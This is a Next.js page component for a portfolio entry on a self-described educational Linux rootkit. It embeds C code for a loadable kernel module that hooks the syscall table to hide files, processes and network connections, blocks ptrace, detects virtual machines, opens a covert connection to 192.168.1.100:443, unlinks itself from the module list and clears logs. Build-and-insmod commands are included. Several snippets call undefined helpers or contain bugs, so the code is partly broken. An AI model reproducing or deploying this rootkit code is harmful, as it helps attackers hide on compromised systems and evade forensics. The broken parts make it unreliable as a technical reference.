'use client'

import { motion } from 'framer-motion'
import DetailPageLayout from '@/components/DetailPageLayout'
import CodeBlock from '@/components/CodeBlock'
import Callout from '@/components/Callout'

export default function LinuxRootkitProjectPage() {
  const features = [
    {
      icon: '🐧',
      title: 'Kernel-Level Persistence',
      description: 'Loadable kernel module (LKM) that operates at the kernel level for maximum stealth.'
    },
    {
      icon: '🔍',
      title: 'Process Hiding',
      description: 'Advanced techniques to hide processes from system monitoring and detection tools.'
    },
    {
      icon: '📁',
      title: 'File System Hiding',
      description: 'Hide files, directories, and network connections from standard system utilities.'
    },
    {
      icon: '🛡️',
      title: 'Anti-Analysis',
      description: 'Built-in techniques to detect and evade debugging, analysis, and forensics tools.'
    }
  ]

  const milestones = [
    {
      date: 'Q2 2024',
      title: 'Initial Research',
      description: 'Kernel module development and syscall hooking research'
    },
    {
      date: 'Q3 2024',
      title: 'Core Functionality',
      description: 'Basic hiding capabilities and persistence mechanisms'
    },
    {
      date: 'Q4 2024',
      title: 'Advanced Features',
      description: 'Anti-analysis and evasion techniques implementation'
    },
    {
      date: 'Q1 2025',
      title: 'Educational Release',
      description: 'Documentation and educational materials for security research'
    }
  ]

  const basicModuleCode = `#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/version.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Darrius Grate");
MODULE_DESCRIPTION("Educational Linux Rootkit");
MODULE_VERSION("1.0");

// Original syscall pointers
asmlinkage long (*original_getdents64)(unsigned int fd, struct linux_dirent64 *dirent, unsigned int count);
asmlinkage long (*original_getdents)(unsigned int fd, struct linux_dirent *dirent, unsigned int count);

// Hidden processes and files
static char hidden_processes[][16] = {"backdoor", "malware", "rootkit"};
static char hidden_files[][32] = {"/tmp/.hidden", "/var/log/.stealth"};

// Hook function for getdents64
asmlinkage long hooked_getdents64(unsigned int fd, struct linux_dirent64 *dirent, unsigned int count) {
    long ret = original_getdents64(fd, dirent, count);
    
    if (ret > 0) {
        struct linux_dirent64 *d;
        int pos = 0;
        
        while (pos < ret) {
            d = (struct linux_dirent64 *)((char *)dirent + pos);
            
            // Hide specific files
            for (int i = 0; i < sizeof(hidden_files) / sizeof(hidden_files[0]); i++) {
                if (strstr(d->d_name, hidden_files[i])) {
                    // Remove this entry by shifting the rest
                    memmove((char *)d, (char *)d + d->d_reclen, ret - pos - d->d_reclen);
                    ret -= d->d_reclen;
                    continue;
                }
            }
            pos += d->d_reclen;
        }
    }
    
    return ret;
}

// Module initialization
static int __init rootkit_init(void) {
    printk(KERN_INFO "Educational Rootkit: Module loaded\\n");
    
    // Hook syscalls
    original_getdents64 = (void *)sys_call_table[__NR_getdents64];
    sys_call_table[__NR_getdents64] = (unsigned long)hooked_getdents64;
    
    return 0;
}

// Module cleanup
static void __exit rootkit_exit(void) {
    // Restore original syscalls
    sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
    
    printk(KERN_INFO "Educational Rootkit: Module unloaded\\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);`

  const processHidingCode = `// Advanced process hiding techniques
#include <linux/sched.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>

// Hide process from /proc
static int hide_proc_show(struct seq_file *m, void *v) {
    struct task_struct *task;
    struct pid *pid;
    
    for_each_process(task) {
        // Skip hidden processes
        if (is_hidden_process(task->comm)) {
            continue;
        }
        
        pid = get_pid(task->group_leader->pids[PIDTYPE_PID].pid);
        seq_printf(m, "%d\\t%s\\n", pid_nr(pid), task->comm);
        put_pid(pid);
    }
    
    return 0;
}

// Hook /proc/pid/stat to hide process details
static int hide_proc_stat_show(struct seq_file *m, struct pid *pid, struct task_struct *task) {
    if (is_hidden_process(task->comm)) {
        return -ENOENT; // Process not found
    }
    
    return proc_pid_stat_show(m, pid, task);
}

// Network connection hiding
static int hide_net_show(struct seq_file *m, void *v) {
    struct sock *sk = (struct sock *)v;
    
    if (is_hidden_connection(sk)) {
        return 0; // Skip this connection
    }
    
    return net_seq_show(m, v);
}

// Anti-debugging techniques
static void anti_debug_init(void) {
    // Disable kernel debugging
    disable_kernel_debugging();
    
    // Hook ptrace to prevent debugging
    original_ptrace = (void *)sys_call_table[__NR_ptrace];
    sys_call_table[__NR_ptrace] = (unsigned long)hooked_ptrace;
    
    // Monitor for analysis tools
    monitor_analysis_tools();
}`

  const evasionCode = `// Advanced evasion and anti-analysis techniques
#include <linux/kallsyms.h>
#include <linux/module.h>

// Detect virtual machines and sandboxes
static int detect_vm_environment(void) {
    // Check for VM-specific hardware
    if (detect_vmware() || detect_virtualbox() || detect_qemu()) {
        return 1;
    }
    
    // Check for hypervisor signatures
    if (detect_hypervisor()) {
        return 1;
    }
    
    // Check for analysis tools
    if (detect_analysis_tools()) {
        return 1;
    }
    
    return 0;
}

// Memory protection and obfuscation
static void protect_memory_regions(void) {
    // Make code sections read-only
    set_memory_ro((unsigned long)rootkit_init, 1);
    set_memory_ro((unsigned long)hooked_getdents64, 1);
    
    // Obfuscate strings
    obfuscate_strings();
    
    // Anti-dumping techniques
    prevent_memory_dumping();
}

// Stealth communication
static int stealth_communication(void) {
    // Use legitimate network protocols
    struct socket *sock;
    struct sockaddr_in addr;
    
    // Create socket using legitimate port
    sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
    
    addr.sin_family = AF_INET;
    addr.sin_port = htons(443); // HTTPS port
    addr.sin_addr.s_addr = in_aton("192.168.1.100");
    
    // Connect with stealth techniques
    return sock->ops->connect(sock, (struct sockaddr *)&addr, sizeof(addr), 0);
}

// Clean up forensic artifacts
static void cleanup_forensic_artifacts(void) {
    // Clear kernel logs
    clear_kernel_logs();
    
    // Remove module from module list
    list_del(&THIS_MODULE->list);
    
    // Clear memory traces
    memset(&rootkit_init, 0, sizeof(rootkit_init));
    
    // Anti-forensics techniques
    prevent_forensic_analysis();
}`

  return (
    <DetailPageLayout 
      title="Linux Rootkit"
      subtitle="Advanced Kernel-Level Rootkit with Stealth Capabilities"
      breadcrumb={{ label: "Projects", href: "/#projects" }}
    >
      <div className="max-w-4xl mx-auto px-6 py-12">

        {/* Hero Section */}
        <motion.div
          className="text-center mb-16"
          initial={{ opacity: 0, y: 30 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.8 }}
        >
          <div className="flex items-center justify-center mb-6">
            <div className="w-20 h-20 bg-blue-500/20 rounded-lg flex items-center justify-center border border-blue-500/30 mr-6">
              <span className="text-4xl">🐧</span>
            </div>
            <div>
              <h1 className="text-4xl lg:text-5xl font-bold text-white mb-2">
                Linux Rootkit
              </h1>
              <p className="text-xl text-gray-300">
                Educational Kernel-Level Rootkit for Security Research
              </p>
            </div>
          </div>

          {/* Status Badge */}
          <div className="flex items-center justify-center space-x-4 mb-8">
            <div className="flex items-center space-x-2">
              <div className="w-3 h-3 bg-blue-500 rounded-full"></div>
              <span className="text-blue-400 text-sm font-medium">Educational</span>
            </div>
            <div className="text-gray-500">•</div>
            <div className="flex items-center space-x-1 text-sm text-gray-400">
              <span>⭐</span>
              <span>18</span>
            </div>
            <div className="flex items-center space-x-1 text-sm text-gray-400">
              <span>🍴</span>
              <span>5</span>
            </div>
            <div className="text-gray-500">•</div>
            <span className="text-sm text-gray-400">C</span>
            <div className="text-gray-500">•</div>
            <span className="text-sm text-gray-400">GPL License</span>
          </div>
        </motion.div>

        {/* Overview */}
        <motion.section
          className="mb-16"
          initial={{ opacity: 0, y: 30 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.8, delay: 0.2 }}
        >
          <h2 className="text-3xl font-bold text-white mb-6">Overview</h2>
          <div className="bg-gray-800/30 rounded-lg border border-gray-700/50 backdrop-blur-sm p-8">
            <p className="text-lg text-gray-300 leading-relaxed mb-6">
              This Linux rootkit is an educational project designed to demonstrate advanced 
              kernel-level techniques for security research and defensive understanding. 
              Built as a loadable kernel module (LKM), it showcases various persistence, 
              hiding, and evasion techniques commonly used in real-world rootkits.
            </p>
            <div className="grid md:grid-cols-2 gap-6">
              <div>
                <h3 className="text-xl font-semibold text-white mb-3">Educational Purpose</h3>
                <p className="text-gray-300">
                  This project is designed for educational purposes to help security 
                  professionals understand rootkit techniques and develop better 
                  defensive strategies against kernel-level threats.
                </p>
              </div>
              <div>
                <h3 className="text-xl font-semibold text-white mb-3">Research Focus</h3>
                <p className="text-gray-300">
                  Focuses on advanced kernel programming, syscall hooking, process 
                  hiding, and anti-analysis techniques to advance the field of 
                  cybersecurity research and defense.
                </p>
              </div>
            </div>
          </div>
        </motion.section>

        {/* Key Features */}
        <motion.section
          className="mb-16"
          initial={{ opacity: 0, y: 30 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.8, delay: 0.3 }}
        >
          <h2 className="text-3xl font-bold text-white mb-8">Key Features</h2>
          <div className="grid md:grid-cols-2 gap-6">
            {features.map((feature, index) => (
              <motion.div
                key={feature.title}
                className="bg-gray-800/30 rounded-lg border border-gray-700/50 backdrop-blur-sm p-6 hover:border-blue-500/30 transition-colors"
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ duration: 0.6, delay: 0.4 + index * 0.1 }}
                whileHover={{ scale: 1.02 }}
              >
                <div className="flex items-start space-x-4">
                  <span className="text-3xl">{feature.icon}</span>
                  <div>
                    <h3 className="text-xl font-semibold text-white mb-2">
                      {feature.title}
                    </h3>
                    <p className="text-gray-300 leading-relaxed">
                      {feature.description}
                    </p>
                  </div>
                </div>
              </motion.div>
            ))}
          </div>
        </motion.section>

        {/* Architecture */}
        <motion.section
          className="mb-16"
          initial={{ opacity: 0, y: 30 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.8, delay: 0.4 }}
        >
          <h2 className="text-3xl font-bold text-white mb-8">Architecture</h2>
          <div className="bg-gray-800/30 rounded-lg border border-gray-700/50 backdrop-blur-sm p-8">
            <div className="grid md:grid-cols-3 gap-8 mb-8">
              <div className="text-center">
                <div className="w-16 h-16 bg-red-500/20 rounded-lg flex items-center justify-center border border-red-500/30 mx-auto mb-4">
                  <span className="text-2xl">🔧</span>
                </div>
                <h3 className="text-lg font-semibold text-white mb-2">Kernel Module</h3>
                <p className="text-gray-300 text-sm">
                  Loadable kernel module (LKM) operating at ring 0
                </p>
              </div>
              <div className="text-center">
                <div className="w-16 h-16 bg-yellow-500/20 rounded-lg flex items-center justify-center border border-yellow-500/30 mx-auto mb-4">
                  <span className="text-2xl">🎣</span>
                </div>
                <h3 className="text-lg font-semibold text-white mb-2">Syscall Hooks</h3>
                <p className="text-gray-300 text-sm">
                  Intercept and modify system calls for stealth operations
                </p>
              </div>
              <div className="text-center">
                <div className="w-16 h-16 bg-green-500/20 rounded-lg flex items-center justify-center border border-green-500/30 mx-auto mb-4">
                  <span className="text-2xl">🛡️</span>
                </div>
                <h3 className="text-lg font-semibold text-white mb-2">Anti-Analysis</h3>
                <p className="text-gray-300 text-sm">
                  Techniques to detect and evade analysis tools
                </p>
              </div>
            </div>
            
            <Callout type="error" title="Educational Use Only">
              This rootkit is for educational and research purposes only. It should only be used 
              in controlled environments with proper authorization. Unauthorized use is strictly prohibited.
            </Callout>
          </div>
        </motion.section>

        {/* Code Examples */}
        <motion.section
          className="mb-16"
          initial={{ opacity: 0, y: 30 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.8, delay: 0.5 }}
        >
          <h2 className="text-3xl font-bold text-white mb-8">Code Examples</h2>
          
          <div className="space-y-8">
            <div>
              <h3 className="text-xl font-semibold text-white mb-4">Basic Kernel Module</h3>
              <CodeBlock
                code={basicModuleCode}
                language="c"
                title="Rootkit Module Structure"
              />
            </div>
            
            <div>
              <h3 className="text-xl font-semibold text-white mb-4">Process Hiding Techniques</h3>
              <CodeBlock
                code={processHidingCode}
                language="c"
                title="Advanced Hiding Mechanisms"
              />
            </div>
            
            <div>
              <h3 className="text-xl font-semibold text-white mb-4">Evasion and Anti-Analysis</h3>
              <CodeBlock
                code={evasionCode}
                language="c"
                title="Anti-Detection Techniques"
              />
            </div>
          </div>
        </motion.section>

        {/* Installation Guide */}
        <motion.section
          className="mb-16"
          initial={{ opacity: 0, y: 30 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.8, delay: 0.6 }}
        >
          <h2 className="text-3xl font-bold text-white mb-8">Installation Guide</h2>
          <div className="bg-gray-800/30 rounded-lg border border-gray-700/50 backdrop-blur-sm p-8">
            <div className="space-y-6">
              <div>
                <h3 className="text-xl font-semibold text-white mb-3">Prerequisites</h3>
                <ul className="text-gray-300 space-y-2">
                  <li>• Linux kernel 4.15+ with development headers</li>
                  <li>• GCC compiler and build tools</li>
                  <li>• Root privileges for module loading</li>
                  <li>• Virtual machine or isolated test environment</li>
                </ul>
              </div>
              
              <div>
                <h3 className="text-xl font-semibold text-white mb-3">Build from Source</h3>
                <CodeBlock
                  code={`git clone https://github.com/DarriusGrate/Linux-Rootkit.git
cd Linux-Rootkit
make
sudo insmod rootkit.ko`}
                  language="bash"
                  title="Build and Load Commands"
                  showLineNumbers={false}
                />
              </div>
              
              <div>
                <h3 className="text-xl font-semibold text-white mb-3">Testing Environment</h3>
                <p className="text-gray-300 mb-4">
                  Recommended testing setup for safe experimentation:
                </p>
                <CodeBlock
                  code={`# Create isolated test environment
# 1. Use a virtual machine (VMware, VirtualBox, QEMU)
# 2. Disable network access during testing
# 3. Create snapshots before testing
# 4. Use a dedicated test kernel

# Load module
sudo insmod rootkit.ko

# Test hiding functionality
ls -la /proc/ | grep hidden_process
ps aux | grep backdoor

# Unload module
sudo rmmod rootkit`}
                  language="bash"
                  title="Testing Commands"
                  showLineNumbers={false}
                />
              </div>
            </div>
          </div>
        </motion.section>

        {/* Development Journey */}
        <motion.section
          className="mb-16"
          initial={{ opacity: 0, y: 30 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.8, delay: 0.7 }}
        >
          <h2 className="text-3xl font-bold text-white mb-8">Development Journey</h2>
          <div className="space-y-6">
            {milestones.map((milestone, index) => (
              <motion.div
                key={milestone.date}
                className="flex items-start space-x-4"
                initial={{ opacity: 0, x: -20 }}
                animate={{ opacity: 1, x: 0 }}
                transition={{ duration: 0.6, delay: 0.8 + index * 0.1 }}
              >
                <div className="flex-shrink-0 w-24 text-sm text-gray-400 font-medium">
                  {milestone.date}
                </div>
                <div className="flex-shrink-0 w-4 h-4 bg-blue-500 rounded-full mt-1"></div>
                <div className="flex-1">
                  <h3 className="text-lg font-semibold text-white mb-1">
                    {milestone.title}
                  </h3>
                  <p className="text-gray-300">
                    {milestone.description}
                  </p>
                </div>
              </motion.div>
            ))}
          </div>
        </motion.section>

        {/* Technical Details */}
        <motion.section
          className="mb-16"
          initial={{ opacity: 0, y: 30 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.8, delay: 0.8 }}
        >
          <h2 className="text-3xl font-bold text-white mb-8">Technical Details</h2>
          <div className="grid md:grid-cols-2 gap-8">
            <div className="bg-gray-800/30 rounded-lg border border-gray-700/50 backdrop-blur-sm p-6">
              <h3 className="text-xl font-semibold text-white mb-4">Tech Stack</h3>
              <div className="flex flex-wrap gap-2">
                {['C', 'Linux Kernel', 'LKM', 'Assembly', 'Makefile', 'GCC'].map((tech) => (
                  <span
                    key={tech}
                    className="px-3 py-1 bg-gray-700/50 text-gray-300 text-sm rounded-full border border-gray-600/30"
                  >
                    {tech}
                  </span>
                ))}
              </div>
            </div>
            
            <div className="bg-gray-800/30 rounded-lg border border-gray-700/50 backdrop-blur-sm p-6">
              <h3 className="text-xl font-semibold text-white mb-4">Compatibility</h3>
              <div className="space-y-2 text-gray-300">
                <div className="flex justify-between">
                  <span>Kernel Versions:</span>
                  <span className="text-green-400">4.15+</span>
                </div>
                <div className="flex justify-between">
                  <span>Architectures:</span>
                  <span className="text-green-400">x86_64</span>
                </div>
                <div className="flex justify-between">
                  <span>Memory Usage:</span>
                  <span className="text-green-400">~5MB</span>
                </div>
              </div>
            </div>
          </div>
        </motion.section>

        {/* Footer */}
        <motion.div
          className="text-center border-t border-gray-700/50 pt-8"
          initial={{ opacity: 0, y: 30 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.8, delay: 0.9 }}
        >
          <div className="flex justify-center space-x-8 mb-6">
            <a
              href="https://github.com/DarriusGrate/Linux-Rootkit"
              target="_blank"
              rel="noopener noreferrer"
              className="flex items-center space-x-2 text-gray-400 hover:text-white transition-colors"
            >
              <span className="text-xl">🐙</span>
              <span>GitHub Repository</span>
            </a>
            <a
              href="https://github.com/DarriusGrate/Linux-Rootkit/issues"
              target="_blank"
              rel="noopener noreferrer"
              className="flex items-center space-x-2 text-gray-400 hover:text-white transition-colors"
            >
              <span className="text-xl">🐛</span>
              <span>Report Issues</span>
            </a>
          </div>
          
          <Callout type="warning" title="Educational Disclaimer">
            This project is for educational and research purposes only. It demonstrates 
            kernel-level programming techniques and should only be used in controlled 
            environments with proper authorization. The author is not responsible for 
            any misuse of this code.
          </Callout>
        </motion.div>
      </div>
    </DetailPageLayout>
  )
}
